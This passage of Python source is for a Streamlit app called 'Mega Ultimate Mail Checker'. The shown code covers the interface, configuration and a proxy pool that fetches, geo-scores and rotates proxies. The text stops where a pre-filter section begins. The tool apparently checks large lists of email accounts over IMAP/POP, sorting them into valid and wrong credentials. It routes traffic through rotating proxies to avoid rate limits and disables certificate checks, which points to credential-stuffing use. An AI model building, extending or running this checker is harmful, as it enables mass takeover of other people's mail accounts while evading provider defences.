import streamlit as str_lit
import asyncio
import imaplib
import poplib
import ssl
import json
import os
import random
import threading
import socket
import sys
import time
import warnings
import glob
import zipfile
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from collections import defaultdict
import pandas as pd
import concurrent.futures
from dataclasses import dataclass
from typing import List, Dict, Optional
import re

# Optional network libs
try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

# --- PySocks Dependency Enforcement ---
if not SOCKS_OK:
    warnings.warn("PySocks is not installed in your Python environment! SOCKS proxy support will be disabled. Run 'pip install PySocks' to enable full proxy routing.")

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# --- Page Config ---
str_lit.set_page_config(
    page_title="Mega Ultimate Mail Checker",
    page_icon="⚡",
    layout="wide"
)

# --- Custom CSS for Styling ---
str_lit.markdown("""
<style>
    .stSlider input[type=range] {
        accent-color: #ff4b4b;
        cursor: pointer;
    }
    .help-box {
        background-color: #1e1e2f;
        border-left: 3px solid #ff4b4b;
        padding: 6px 10px;
        margin: 2px 0 8px 0;
        font-size: 0.8rem;
        color: #d1d5db;
        border-radius: 4px;
    }
    .startup-box {
        background-color: #111827;
        border: 1px solid #374151;
        padding: 12px;
        border-radius: 6px;
        font-family: monospace;
        color: #10B981;
        margin-bottom: 15px;
    }
</style>
""", unsafe_allow_html=True)

str_lit.title("⚡ Mega Ultimate Mail Checker v11.5 (Tri-Mode Edition)")
str_lit.markdown("Asynchronous proxy-backed mail validation engine featuring Fast Mode, Normal Mode, and Deep/Aggressive Mode with prioritized fallback queue logic and adaptive circuit breakers.")

# --- Persistent Session State Initialization ---
if "engine_has_run" not in str_lit.session_state:
    str_lit.session_state.engine_has_run = False
if "valid_results" not in str_lit.session_state:
    str_lit.session_state.valid_results = []
if "wrong_results" not in str_lit.session_state:
    str_lit.session_state.wrong_results = []
if "need_app_results" not in str_lit.session_state:
    str_lit.session_state.need_app_results = []
if "conn_results" not in str_lit.session_state:
    str_lit.session_state.conn_results = []
if "report_entries" not in str_lit.session_state:
    str_lit.session_state.report_entries = []
if "log_lines" not in str_lit.session_state:
    str_lit.session_state.log_lines = []
if "startup_entries" not in str_lit.session_state:
    str_lit.session_state.startup_entries = []
if "zip_bytes" not in str_lit.session_state:
    str_lit.session_state.zip_bytes = None
if "zip_name" not in str_lit.session_state:
    str_lit.session_state.zip_name = ""
if "clean_valid_count" not in str_lit.session_state:
    str_lit.session_state.clean_valid_count = 0
if "checked_emails_set" not in str_lit.session_state:
    str_lit.session_state.checked_emails_set = set()
if "last_checked_index" not in str_lit.session_state:
    str_lit.session_state.last_checked_index = 0
if "run_completion_status" not in str_lit.session_state:
    str_lit.session_state.run_completion_status = "Unfinished"
if "start_timestamp" not in str_lit.session_state:
    str_lit.session_state.start_timestamp = None
if "end_timestamp" not in str_lit.session_state:
    str_lit.session_state.end_timestamp = None
if "total_duration" not in str_lit.session_state:
    str_lit.session_state.total_duration = None

def log_startup(msg):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] [INIT/HOOD] {msg}"
    if entry not in str_lit.session_state.startup_entries:
        str_lit.session_state.startup_entries.append(entry)

log_startup("Application process started. Initializing session state and loading configurations...")

# --- State Management & Thread Locks ---
cache_lock = threading.Lock()
proxy_lock = threading.Lock()
file_write_lock = threading.Lock()
session_state_lock = threading.Lock()
bad_proxies = set()
consecutive_proxy_failures = defaultdict(int)
circuit_breaker_until = {}
failed_domain_cache = {}

# --- Configuration Dataclass for Tri-Mode Support ---
@dataclass
class CheckerConfig:
    mode_name: str = "Normal"
    fast_mode: bool = False
    max_concurrent_checks: int = 50
    connect_timeout: float = 5.0
    read_timeout: float = 5.0
    max_retries: int = 2
    failure_cooldown: float = 30.0

# --- Automatic Streamlit Secrets-to-Env Bridge ---
def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        return
    os.environ[str(k)] = str(v)

try:
    for k, v in str_lit.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

# --- Config & Proxy Key Loaders (Secrets only) ---
WEBSHARE_KEYS = [line.strip() for line in os.getenv("WEBSHARE_KEYS", "").splitlines() if line.strip()]
OXYLABS_PROXIES = [line.strip() for line in (os.getenv("OXYLABS_BASE") or os.getenv("OXYLABS_PROXIES") or "").splitlines() if line.strip()]
log_startup(f"Secrets keys: webshare={len(WEBSHARE_KEYS)} oxylabs={len(OXYLABS_PROXIES)}")
if not WEBSHARE_KEYS and not OXYLABS_PROXIES:
    str_lit.sidebar.error("No proxy keys. Add WEBSHARE_KEYS and OXYLABS_BASE in Settings -> Secrets.")

if "help_states" not in str_lit.session_state:
    str_lit.session_state.help_states = {}

def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
    try:
        if key_name not in str_lit.session_state.help_states:
            str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}
        
        state_data = str_lit.session_state.help_states[key_name]
        if state_data.get("visible", False):
            if time.time() - state_data.get("time", 0) > 10.0:
                str_lit.session_state.help_states[key_name]["visible"] = False

        col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
        val = None
        with col_lbl:
            if widget_type == "label":
                str_lit.markdown(f"**{label_text}**")
            elif widget_type == "checkbox":
                try:
                    val = str_lit.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
                except Exception as widget_err:
                    str_lit.error(f"Widget payload/input error: {widget_err}")
                    val = kwargs.get("value", False)
            elif widget_type in ["text", "selectbox"]:
                str_lit.markdown(f"**{label_text}**")

        with col_btn:
            if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
                try:
                    current = str_lit.session_state.help_states[key_name]["visible"]
                    str_lit.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
                except Exception as btn_err:
                    warnings.warn(f"State transition error in help button: {btn_err}")

        if str_lit.session_state.help_states[key_name]["visible"]:
            str_lit.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

        if widget_type == "checkbox":
            return val
    except Exception as e:
        warnings.warn(f"Error rendering instant help widget {key_name}: {e}")
    return None

# --- Sidebar Control Panel & Tri-Mode Selector ---
str_lit.sidebar.header("⚙ Engine Control Panel")

checker_mode = str_lit.sidebar.selectbox(
    "⚡ Select Engine Mode:",
    options=["Normal Mode", "Fast Mode", "Deep / Aggressive Mode"],
    index=0,
    help="Normal Mode: Balanced performance and deep checks. Fast Mode: Lightweight syntax, DNS MX pre-filtering, and rapid port checking. Deep/Aggressive Mode: Maximum depth checks, multiple fallbacks, and strict validation."
)

if checker_mode == "Fast Mode":
    engine_config = CheckerConfig(
        mode_name="Fast",
        fast_mode=True,
        max_concurrent_checks=100,
        connect_timeout=3.0,
        read_timeout=3.0,
        max_retries=1,
        failure_cooldown=60.0
    )
    workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=100, value=60, step=5)
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=3, max_value=60, value=15, step=5)
    timeout = str_lit.sidebar.slider("Timeout", min_value=1, max_value=15, value=3, step=1)
elif checker_mode == "Deep / Aggressive Mode":
    engine_config = CheckerConfig(
        mode_name="Deep",
        fast_mode=False,
        max_concurrent_checks=30,
        connect_timeout=10.0,
        read_timeout=10.0,
        max_retries=4,
        failure_cooldown=10.0
    )
    workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=50, value=15, step=1)
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=10, max_value=180, value=45, step=5)
    timeout = str_lit.sidebar.slider("Timeout", min_value=5, max_value=45, value=10, step=1)
else:  # Normal Mode (Default)
    engine_config = CheckerConfig(
        mode_name="Normal",
        fast_mode=False,
        max_concurrent_checks=50,
        connect_timeout=5.0,
        read_timeout=5.0,
        max_retries=1,
        failure_cooldown=30.0
    )
    workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=75, value=30, step=5)
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=5, max_value=90, value=25, step=5)
    timeout = str_lit.sidebar.slider("Timeout", min_value=2, max_value=20, value=5, step=1)

max_acc = str_lit.sidebar.slider("Max Accounts", min_value=0, max_value=5000, value=5000, step=100)
blacklist_cf = str_lit.sidebar.slider("Blacklist CF", min_value=0, max_value=500, value=100, step=10)

str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🎛 Advanced Control Rules")
dynamic_worker_scaling = str_lit.sidebar.toggle("⚡ Thread Auto-Scaling / Dynamic Workers", value=True, help="Let the engine dynamically scale worker threads up or down based on real-time network conditions.")

custom_whitelist_input = str_lit.sidebar.text_input("Custom Whitelist Domains (comma-separated)", placeholder="gmail.com, outlook.com")
custom_blacklist_input = str_lit.sidebar.text_input("Custom Blacklist Domains (comma-separated)", placeholder="spamdomain.com")

str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🌐 Proxy / Pool Configuration")

min_proxy_score = str_lit.sidebar.slider("Min Proxy Score", min_value=0, max_value=100, value=40, step=10)
proxy_precheck_timeout = str_lit.sidebar.slider("Proxy Pre-Check Timeout (Sec)", min_value=1, max_value=10, value=3, step=1)
if "pool_mode" not in str_lit.session_state:
    str_lit.session_state.pool_mode = "all"
if "pool_locked" not in str_lit.session_state:
    str_lit.session_state.pool_locked = True
if "picked_countries" not in str_lit.session_state:
    str_lit.session_state.picked_countries = ["US"]

def load_json(path, default=None):
    if default is None: default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
                log_startup(f"Successfully loaded JSON cache from {path}.")
                return data
        except Exception as e:
            log_startup(f"WARNING: Failed to load JSON file {path}: {e}")
            return default
    log_startup(f"JSON cache file {path} not found. Using default.")
    return default

domain_cache = load_json("domain_cache.json", {})
proxy_meta = load_json("proxy_meta.json", {})

def load_proxies():
    if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
        default_seed = OXYLABS_PROXIES[:]
        try:
            with file_write_lock:
                with open("proxies.txt", "w", encoding="utf-8") as f:
                    f.write("\n".join(default_seed) + "\n")
            log_startup("Initialized default proxies.txt file.")
        except Exception as e:
            log_startup(f"WARNING: Failed to initialize default proxies.txt: {e}")

    try:
        with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt.")
        return raw_list if raw_list else OXYLABS_PROXIES
    except Exception as e:
        log_startup(f"WARNING: Failed to read proxies.txt: {e}")
        return OXYLABS_PROXIES

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        total = success_count + fail_count
        if total == 0:
            return initial_latency_score
        smoothed_success = success_count + 2
        smoothed_fail = fail_count + 1
        smoothed_total = smoothed_success + smoothed_fail
        success_rate = (smoothed_success / smoothed_total) * 100
        score = int(success_rate - (fail_count * 5))
        return max(0, min(100, score))
    except Exception:
        return initial_latency_score

def is_proxy_alive(proxy_host, proxy_port, timeout=2):
    try:
        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout) as conn:
            return True
    except (socket.timeout, socket.error, ValueError, TypeError):
        return False
    except Exception:
        return False

def test_single_proxy(proxy_str):
    try:
        info = parse_proxy(proxy_str)
        if not info or not SOCKS_OK: return False, "Invalid Format", "Unknown", 0
        
        if not is_proxy_alive(info["host"], info["port"], timeout=2.0):
            return False, "TCP Connection Timeout", "Unknown", 0

        start = time.time()
        test_success = False
        
        sock = None
        try:
            kwargs = {
                "proxy_type": socks.SOCKS5,
                "proxy_addr": info["host"],
                "proxy_port": info["port"]
            }
            if info["user"]:
                kwargs["proxy_username"] = info["user"]
                kwargs["proxy_password"] = info["pass"]
            sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            test_success = True
        except Exception:
            pass
        finally:
            if sock:
                try: sock.shutdown(socket.SHUT_RDWR)
                except Exception: pass
                try: sock.close()
                except Exception: pass

        if not test_success:
            try:
                kwargs = {
                    "proxy_type": socks.HTTP,
                    "proxy_addr": info["host"],
                    "proxy_port": info["port"]
                }
                if info["user"]:
                    kwargs["proxy_username"] = info["user"]
                    kwargs["proxy_password"] = info["pass"]
                sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                test_success = True
            except Exception:
                pass
            finally:
                if sock:
                    try: sock.shutdown(socket.SHUT_RDWR)
                    except Exception: pass
                    try: sock.close()
                    except Exception: pass
                
        latency = int((time.time() - start) * 1000)
        initial_score = max(0, min(100, 100 - int(latency / 15)))
        country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
        region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")

        if country == "Unknown" and requests:
            try:
                r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=1.5)
                if r.status_code == 200:
                    data = r.json()
                    if data.get("status") == "success":
                        country = data.get("country", "Unknown")
                        region = data.get("regionName", "Unknown")
            except Exception:
                pass

        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": region, "latency_ms": latency}
            m = proxy_meta[proxy_str]
            if test_success:
                m["success"] = m.get("success", 0) + 1
                consecutive_proxy_failures[proxy_str] = 0
            else:
                m["fails"] = m.get("fails", 0) + 1
                consecutive_proxy_failures[proxy_str] += 1
            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_latency_score=initial_score)
            m["country"] = country
            m["region"] = region
            m["latency_ms"] = latency
        
        current_score = proxy_meta[proxy_str]["score"]
        if test_success:
            return True, f"{latency}ms", f"{country}, {region}", current_score
        else:
            return False, "Connection Failed", f"{country}, {region}", current_score
    except Exception as e:
        return False, f"Error: {str(e)[:30]}", "Unknown", 0

def parse_proxy(proxy_str):
    if not proxy_str: return None
    try:
        p = proxy_str.strip()
        if "://" in p:
            u = urlparse(p)
            return {"host": u.hostname, "port": u.port or 80, "user": u.username, "pass": u.password}
        if "@" in p:
            cred, hostpart = p.rsplit("@", 1)
            user, pwd = cred.split(":", 1)
            host, port = hostpart.split(":", 1)
            return {"host": host, "port": int(port), "user": user, "pass": pwd}
        parts = p.split(":")
        if len(parts) == 4:
            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
        if len(parts) == 2:
            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
    except Exception:
        pass
    return None

def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = meta.get("country", "Unknown").upper()
            if c == "UNKNOWN" or not c:
                if "-country-" in p:
                    try:
                        c = p.split("-country-")[1].split(":")[0].upper()
                    except Exception:
                        c = "UNKNOWN"
            score = meta.get("score", 50)
            country_scores[c].append(score)
        
        avg_country_scores = []
        for c, scores in country_scores.items():
            avg_score = sum(scores) / len(scores) if scores else 0
            avg_country_scores.append((c, avg_score))
        avg_country_scores.sort(key=lambda x: x[1], reverse=True)
        return [item[0] for item in avg_country_scores if item[0] != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
    except Exception:
        return ["US", "GB", "DE", "CA", "FR"]

if "pool_pick" not in str_lit.session_state:
    str_lit.session_state.pool_pick = None

selected_countries = list(str_lit.session_state.picked_countries)
selected_mix_countries = list(str_lit.session_state.picked_countries)
pool_mode = str_lit.session_state.pool_mode

if str_lit.session_state.pool_locked:
    str_lit.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        str_lit.sidebar.caption("Picked: " + ", ".join(str_lit.session_state.picked_countries))
    if str_lit.sidebar.button("Change pool"):
        str_lit.session_state.pool_locked = False
        str_lit.session_state.pool_pick = None
        str_lit.rerun()
else:
    str_lit.sidebar.caption("Tap one")
    if str_lit.sidebar.button("all", key="pool_btn_all"):
        str_lit.session_state.pool_mode = "all"
        str_lit.session_state.pool_locked = True
        str_lit.session_state.pool_pick = None
        str_lit.rerun()
    if str_lit.sidebar.button("us_only", key="pool_btn_us"):
        str_lit.session_state.pool_mode = "us_only"
        str_lit.session_state.pool_locked = True
        str_lit.session_state.pool_pick = None
        str_lit.rerun()
    if str_lit.sidebar.button("country", key="pool_btn_country"):
        str_lit.session_state.pool_pick = "country"
        str_lit.rerun()
    if str_lit.sidebar.button("mix", key="pool_btn_mix"):
        str_lit.session_state.pool_pick = "mix"
        str_lit.rerun()
    choice = str_lit.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores() or ["US"]
        with str_lit.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                label = c
                if choice == "mix":
                    scores = [proxy_meta.get(p, {}).get("score", 0) for p in load_proxies() if str(proxy_meta.get(p, {}).get("country", "")).upper() == c]
                    best = max(scores) if scores else 0
                    label = f"{c}  score={best}"
                if str_lit.checkbox(label, value=c in str_lit.session_state.picked_countries, key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if str_lit.form_submit_button("Done"):
                if not picked:
                    str_lit.sidebar.error("Pick at least one country")
                else:
                    str_lit.session_state.pool_mode = choice
                    str_lit.session_state.picked_countries = picked
                    str_lit.session_state.pool_locked = True
                    str_lit.session_state.pool_pick = None
                    str_lit.rerun()

str_lit.sidebar.markdown("---")

use_proxy = instant_help("use_proxy", "Route all checker requests through proxy nodes to prevent IP rate-limiting.", "Use Proxy", widget_type="checkbox", value=True)
retry_cf = instant_help("retry_cf", "Automatically retry connection failures using alternative fallback paths.", "Retry CF", widget_type="checkbox", value=False)
self_signed = instant_help("self_signed", "Bypass strict SSL certificate validation errors for secure connections.", "Allow Self-Signed", widget_type="checkbox", value=True)
proxy_test_flight = instant_help("proxy_test_flight", "Perform an initial health and latency probe on proxies prior to live execution.", "Test Flight", widget_type="checkbox", value=True)
skip_app = instant_help("skip_app", "Filter out accounts requiring explicit app passwords or token generation upfront.", "Skip Strict App-Only Providers", widget_type="checkbox", value=True)
debug_mode = instant_help("debug_mode", "Stream verbose logs and error tracing directly into the UI interface.", "Enable Debug Mode", widget_type="checkbox", value=True)

resolved_proxy_mode = str_lit.sidebar.selectbox(
    "Proxy Mode Engine:",
    options=["aggressive", "fallback", "sticky", "off"],
    index=1
)

# Configuration state management linked strictly to the apply button
if "applied_cfg" not in str_lit.session_state:
    str_lit.session_state.applied_cfg = {
        "MODE_NAME": engine_config.mode_name,
        "MAX_WORKERS_START": workers,
        "MAX_WORKERS_MAX": max(workers * 2, 25),
        "TIMEOUT": timeout,
        "ACCOUNT_DEADLINE": deadline,
        "MAX_ACCOUNTS": max_acc,
        "BLACKLIST_CF": blacklist_cf,
        "PROXY_MODE": "on" if not use_proxy else resolved_proxy_mode,
        "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
        "ALLOW_SELF_SIGNED": self_signed,
        "PROXY_TEST_FLIGHT": proxy_test_flight,
        "SKIP_STRICT_APP_PROVIDERS": skip_app,
        "DEBUG": debug_mode,
        "MIN_PROXY_SCORE": min_proxy_score,
        "PROXY_PRECHECK_TIMEOUT": proxy_precheck_timeout,
        "POOL_MODE": pool_mode,
        "SELECTED_COUNTRIES": selected_countries,
        "SELECTED_MIX_COUNTRIES": selected_mix_countries,
        "DYNAMIC_WORKER_SCALING": dynamic_worker_scaling,
        "CUSTOM_WHITELIST": [d.strip().lower() for d in custom_whitelist_input.split(",") if d.strip()],
        "CUSTOM_BLACKLIST": [d.strip().lower() for d in custom_blacklist_input.split(",") if d.strip()],
        "PROXY_FILE": "proxies.txt",
        "RESULTS_DIR": "mail_results",
        "CACHE_FILE": "domain_cache.json",
        "PROXY_META_FILE": "proxy_meta.json",
        "MAX_PROXY_TRIES": engine_config.max_retries,
        "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
        "FAST_MODE": engine_config.fast_mode
    }

if str_lit.sidebar.button("💾 Apply Settings", type="primary"):
    str_lit.session_state.applied_cfg = {
        "MODE_NAME": engine_config.mode_name,
        "MAX_WORKERS_START": workers,
        "MAX_WORKERS_MAX": max(workers * 2, 25),
        "TIMEOUT": timeout,
        "ACCOUNT_DEADLINE": deadline,
        "MAX_ACCOUNTS": max_acc,
        "BLACKLIST_CF": blacklist_cf,
        "PROXY_MODE": "on" if not use_proxy else resolved_proxy_mode,
        "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
        "ALLOW_SELF_SIGNED": self_signed,
        "PROXY_TEST_FLIGHT": proxy_test_flight,
        "SKIP_STRICT_APP_PROVIDERS": skip_app,
        "DEBUG": debug_mode,
        "MIN_PROXY_SCORE": min_proxy_score,
        "PROXY_PRECHECK_TIMEOUT": proxy_precheck_timeout,
        "POOL_MODE": pool_mode,
        "SELECTED_COUNTRIES": selected_countries,
        "SELECTED_MIX_COUNTRIES": selected_mix_countries,
        "DYNAMIC_WORKER_SCALING": dynamic_worker_scaling,
        "CUSTOM_WHITELIST": [d.strip().lower() for d in custom_whitelist_input.split(",") if d.strip()],
        "CUSTOM_BLACKLIST": [d.strip().lower() for d in custom_blacklist_input.split(",") if d.strip()],
        "PROXY_FILE": "proxies.txt",
        "RESULTS_DIR": "mail_results",
        "CACHE_FILE": "domain_cache.json",
        "PROXY_META_FILE": "proxy_meta.json",
        "MAX_PROXY_TRIES": engine_config.max_retries,
        "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
        "FAST_MODE": engine_config.fast_mode
    }
    str_lit.sidebar.success("Settings applied successfully!")
    log_startup("User applied new configuration settings via sidebar control panel.")

CFG = str_lit.session_state.applied_cfg

try:
    os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
    log_startup(f"Verified/Created results directory at '{CFG['RESULTS_DIR']}'.")
except Exception as e:
    log_startup(f"WARNING: Failed to create results directory: {e}")

def save_domain_cache():
    try:
        with file_write_lock:
            with cache_lock:
                with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
                    json.dump(domain_cache, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save domain cache: {e}")

def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save proxy meta: {e}")

def get_filtered_active_proxies():
    try:
        raw = load_proxies()
        filtered = []
        min_score = CFG.get("MIN_PROXY_SCORE", 10)
        mode = CFG.get("POOL_MODE", "all")
        chosen_countries = CFG.get("SELECTED_COUNTRIES", [])
        chosen_mix = CFG.get("SELECTED_MIX_COUNTRIES", [])
        now = time.time()

        with proxy_lock:
            meta_snapshot = dict(proxy_meta)
            breaker_snapshot = dict(circuit_breaker_until)

        for p in raw:
            if p in bad_proxies:
                continue
            if p in breaker_snapshot and now < breaker_snapshot[p]:
                continue
            meta = meta_snapshot.get(p, {})
            score = meta.get("score", 50)
            country = meta.get("country", "Unknown").upper()

            if score < min_score:
                continue

            if mode == "all":
                filtered.append(p)
            elif mode == "us_only":
                if "US" in country or "UNITED STATES" in country or "-country-US" in p:
                    filtered.append(p)
            elif mode == "country":
                if any(cc in country or cc in p.upper() for cc in chosen_countries):
                    filtered.append(p)
            elif mode == "mix":
                if any(mc in country or mc in p.upper() for mc in chosen_mix):
                    filtered.append(p)
            else:
                filtered.append(p)

        log_startup(f"Proxy filtering complete. Active pool contains {len(filtered)} out of {len(raw)} proxies.")
        return filtered if filtered else raw
    except Exception as e:
        log_startup(f"WARNING: Error filtering active proxies: {e}")
        return load_proxies()

all_proxies = load_proxies()
filtered_pool = get_filtered_active_proxies()

# --- 🖥️ Startup & Under-The-Hood Display Panel ---
str_lit.markdown("---")
str_lit.markdown("### 🖥️ Startup & Under-The-Hood Display Panel")
str_lit.markdown("Real-time inspection of app entries, startup parameters, proxy pools, and background engine diagnostic checks.")

startup_expander = str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood", expanded=True)
with startup_expander:
    str_lit.markdown("Below is the real-time activity ledger recording system boot, config injection, proxy health checks, and engine state transitions:")
    startup_log_display = str_lit.empty()
    startup_log_display.code("\n".join(str_lit.session_state.startup_entries), language="text")
    
    col_st1, col_st2 = str_lit.columns(2)
    with col_st1:
        if str_lit.button("🔄 Refresh Startup Screen"):
            str_lit.rerun()
    with col_st2:
        if str_lit.button("🧹 Clear Startup Logs"):
            str_lit.session_state.startup_entries = []
            log_startup("Startup logs cleared by user.")
            str_lit.rerun()

with str_lit.sidebar:
    str_lit.markdown("---")
    str_lit.markdown("### 🌐 Proxy Management & Health")
    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
    
    with str_lit.expander("➕ Add Custom Proxies", expanded=False):
        custom_proxy_text = str_lit.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
        if str_lit.button("Save Custom Proxies"):
            if custom_proxy_text.strip():
                try:
                    new_proxies = [l.strip() for l in custom_proxy_text.splitlines() if l.strip() and not l.startswith("#")]
                    existing = load_proxies()
                    combined = list(dict.fromkeys(existing + new_proxies))
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(combined) + "\n")
                    log_startup(f"Added {len(new_proxies)} custom proxies successfully.")
                    str_lit.success(f"Added {len(new_proxies)} custom proxies successfully!")
                    str_lit.rerun()
                except Exception as ex:
                    log_startup(f"ERROR: Failed saving custom proxies: {ex}")
                    str_lit.error(f"Error saving custom proxies: {ex}")
    
    if str_lit.button("📥 Fetch & Test All Proxies"):
        log_startup("Initiating bulk fetch and test of Webshare & Oxylabs proxies...")
        if requests is None:
            str_lit.error("Missing 'requests' library.")
        else:
            with str_lit.spinner("Fetching from Webshare & Oxylabs..."):
                all_raw = []
                
                def fetch_ws(key):
                    if not requests: return []
                    proxies = []
                    try:
                        url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=250"
                        headers = {"Authorization": f"Token {key}"}
                        response = requests.get(url, headers=headers, timeout=8)
                        if response.status_code == 200:
                            data = response.json()
                            for item in data.get("results", []):
                                ip, port, user, pwd = item.get("proxy_address"), item.get("port"), item.get("username"), item.get("password")
                                if ip and port:
                                    proxies.append(f"{user}:{pwd}@{ip}:{port}" if user and pwd else f"{ip}:{port}")
                    except Exception as e:
                        warnings.warn(f"Failed fetching Webshare proxy key: {e}")
                    return proxies

                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                        ws_results = executor.map(fetch_ws, WEBSHARE_KEYS)
                        for res in ws_results:
                            all_raw.extend(res)
                except Exception as e:
                    warnings.warn(f"ThreadPool Webshare fetch error: {e}")

                for ox in OXYLABS_PROXIES:
                    all_raw.append(ox)
                all_raw = list(dict.fromkeys(all_raw))
                if not all_raw:
                    all_raw = OXYLABS_PROXIES[:]

                alive = []
                try:
                    with ThreadPoolExecutor(max_workers=10) as ex:
                        future_to_proxy = {ex.submit(test_single_proxy, proxy): proxy for proxy in all_raw}
                        for future in as_completed(future_to_proxy, timeout=15):
                            proxy_str = future_to_proxy[future]
                            try:
                                res = future.result(timeout=2)
                                if res and res[0]:
                                    alive.append(proxy_str)
                            except Exception:
                                continue
                except Exception as e:
                    warnings.warn(f"Proxy test batch error: {e}")
                    alive = all_raw[:20]
                    
                if not alive:
                    alive = all_raw[:20] if all_raw else OXYLABS_PROXIES[:]

                try:
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(str(item) for item in alive) + ("\n" if alive else ""))
                    save_proxy_meta()
                    log_startup(f"Proxy fetch & test complete. Saved {len(alive)} operational proxies.")
                except Exception as ex:
                    log_startup(f"ERROR: Failed writing proxies file: {ex}")
                    str_lit.error(f"Failed to write proxies file: {ex}")

            str_lit.success(f"Success! Saved {len(alive)} operational proxies.")
            str_lit.rerun()

    with str_lit.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
        if proxy_meta:
            proxy_data_list = []
            for p_str, meta in proxy_meta.items():
                info = parse_proxy(p_str)
                host_port = f"{info['host']}:{info['port']}" if info else "Unknown"
                lat_ms = meta.get("latency_ms", "N/A")
                proxy_data_list.append({
                    "Proxy": host_port,
                    "Latency": f"{lat_ms} ms" if isinstance(lat_ms, int) else "N/A",
                    "Country": meta.get("country", "Unknown"),
                    "Region": meta.get("region", "Unknown"),
                    "Score": meta.get("score", 50),
                    "Fails": meta.get("fails", 0),
                    "Successes": meta.get("success", 0)
                })
            str_lit.dataframe(pd.DataFrame(proxy_data_list), width='stretch')
            
            col_ref1, col_ref2 = str_lit.columns(2)
            with col_ref1:
                if str_lit.button("🔄 Refresh Dashboard"):
                    str_lit.rerun()
            with col_ref2:
                if str_lit.button("🧹 Clean Dead / Low-Score"):
                    with proxy_lock:
                        for k, m in list(proxy_meta.items()):
                            if m.get("score", 50) < 5 or m.get("fails", 0) >= 10:
                                proxy_meta.pop(k, None)
                    save_proxy_meta()
                    log_startup("Cleaned dead or low-score proxies from metadata.")
                    str_lit.success("Cleaned!")
                    str_lit.rerun()
        else:
            str_lit.info("No proxy metadata recorded yet.")

# --- Pre-filter Engine ---
DISPOSABLE = {
